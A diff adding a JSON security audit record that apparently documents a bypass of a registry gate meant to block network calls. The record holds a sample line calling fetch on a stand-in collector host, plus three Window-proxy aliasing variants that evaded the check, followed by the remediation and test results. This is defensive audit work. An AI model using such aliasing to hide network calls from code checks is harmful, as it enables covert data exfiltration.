@@ -1,0 +1,30 @@
+{
+  "schemaVersion": 1,
+  "finding": "SEC-37-116",
+  "auditId": "AUD-278",
+  "severity": "medium",
+  "title": "Registry gate accepted a fetch alias assigned from a Window proxy",
+  "source": "let browserWindow; ({ window: browserWindow } = globalThis); const request = browserWindow.fetch; request(\"https://collector.invalid/data\");",
+  "sourceExecution": "none; TypeScript AST analysis only",
+  "reproduction": {
+    "beforeFix": "The checker returned pass both for a mutable identifier assigned from globalThis.window and for destructuring assignment into an existing identifier before its aliased fetch call.",
+    "command": "pnpm exec vitest run packages/registry-gate/src/__tests__/window-proxy-network-alias.test.ts",
+    "afterFix": "Source-order-aware analysis rejects direct and destructuring assignments from Window proxies, including document.defaultView; the full contribution gate rejects representative cases."
+  },
+  "variantsNowRejected": [
+    "let browserWindow; browserWindow = globalThis.window; browserWindow.fetch(...)",
+    "let browserWindow; ({ window: browserWindow } = globalThis); browserWindow.fetch(...)",
+    "let activeWindow; ({ defaultView: activeWindow } = document); activeWindow.fetch(...)"
+  ],
+  "remediation": "Index identifier assignment expressions once per TypeScript checker/source file and resolve prior assignments against the existing trusted Window alias logic.",
+  "validation": {
+    "focusedRegression": "2 tests passed; 16 Window/Document proxy and alias forms rejected, including mutable and destructuring assignments.",
+    "registryGatePackage": "76 tests passed.",
+    "fullWorkspaceTests": "1206 tests passed in 77 files.",
+    "typecheck": "22 workspace packages passed.",
+    "changedFileLint": "passed.",
+    "auditAll": "passed all 16 behavioral gates; scanned 324/324 canonical resources; built the 718-page Astro site and Sites Worker; bundle budgets, provenance, secret/security, and dependency audits passed."
+  },
+  "deployment": "not deployed; release-candidate verification remains open",
+  "capturedAtUtc": "2026-10-22T14:11:44.0593555Z"
+}
